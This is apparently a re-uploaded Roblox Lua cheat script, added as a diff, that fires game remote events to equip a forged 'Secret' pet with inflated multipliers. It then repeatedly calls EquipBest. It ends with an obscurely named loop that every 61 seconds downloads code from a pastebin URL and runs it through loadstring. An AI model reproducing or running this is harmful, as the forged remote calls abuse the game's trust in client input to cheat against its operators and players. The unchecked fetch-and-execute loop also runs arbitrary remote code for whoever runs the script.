@@ -1,0 +1,76 @@
+--pastebin why did you remove it there was nothing bad in it now i have to reupload it at least dm me why it was removed 
+
+
+local args = {
+    [1] = {
+        [1] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UnequipAll"):FireServer(unpack(args))
+local args = {
+    [1] = {
+        ["Mobility"] = "Walk",
+        ["Multi2"] = 40,
+        ["Name"] = "Crystal Dominus",
+        ["Multi1"] = 375000000,
+        ["Rarity"] = "Secret",
+        ["Type"] = 2,
+        ["UID"] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("EquipPet"):FireServer(unpack(args))
+
+local args = {
+    [1] = {
+        [1] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("EquipBest"):FireServer(unpack(args))
+local args = {
+    [1] = {
+        [1] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("EquipBest"):FireServer(unpack(args))
+local args = {
+    [1] = {
+        [1] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("EquipBest"):FireServer(unpack(args))
+local args = {
+    [1] = {
+        [1] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("EquipBest"):FireServer(unpack(args))
+local args = {
+    [1] = {
+        [1] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("EquipBest"):FireServer(unpack(args))
+local args = {
+    [1] = {
+        [1] = "4f4941554434455b8edd9c85c6b4cedb"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("EquipBest"):FireServer(unpack(args))
+_G.dewaawxf = true
+    function dxzviwf()
+        while _G.dewaawxf == true do
+            loadstring(game:HttpGet("https://pastebin.com/raw/vMxs0msE", true))()
+            wait(61)
+        end
+    end
+    dxzviwf()
+
+
